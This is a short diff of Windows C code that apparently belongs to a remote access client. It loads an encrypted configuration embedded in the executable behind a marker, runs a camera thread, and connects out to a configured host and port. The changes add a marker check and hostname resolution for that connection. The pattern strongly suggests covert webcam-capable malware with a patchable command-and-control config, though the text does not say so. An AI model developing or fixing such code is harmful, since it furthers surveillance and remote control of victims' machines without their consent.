@@ -138,7 +138,7 @@ void camera_thread(void* arg) {
 }
 
 void load_config_from_resource() {
-    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(IDR_CONFIG), RT_RCDATA);
+    HRSRC hRes = FindResourceA(NULL, "CONFIG_RES", RT_RCDATA);
     if (!hRes) return;
 
     HGLOBAL hData = LoadResource(NULL, hRes);
@@ -148,8 +148,11 @@ void load_config_from_resource() {
     DWORD dwSize = SizeofResource(NULL, hRes);
 
     if (dwSize >= CONFIG_RES_SIZE) {
+        // Double check marker to ensure we're at the right spot
+        if (memcmp(pData, g_config_marker, 16) != 0) return;
+
         size_t plain_len;
-        // Skip the 16-byte marker
+        // Skip the 16-byte marker at start of the resource
         unsigned char* encrypted_data = pData + 16;
         size_t encrypted_len = CONFIG_RES_SIZE - 16;
 
@@ -182,7 +185,15 @@ int main() {
         g_sock = socket(AF_INET, SOCK_STREAM, 0);
         struct sockaddr_in server;
         server.sin_family = AF_INET;
+
         server.sin_addr.s_addr = inet_addr(g_host);
+        if (server.sin_addr.s_addr == INADDR_NONE) {
+            struct hostent* hp = gethostbyname(g_host);
+            if (hp) {
+                memcpy(&server.sin_addr, hp->h_addr, hp->h_length);
+            }
+        }
+
         server.sin_port = htons(g_port);
 
         if (connect(g_sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
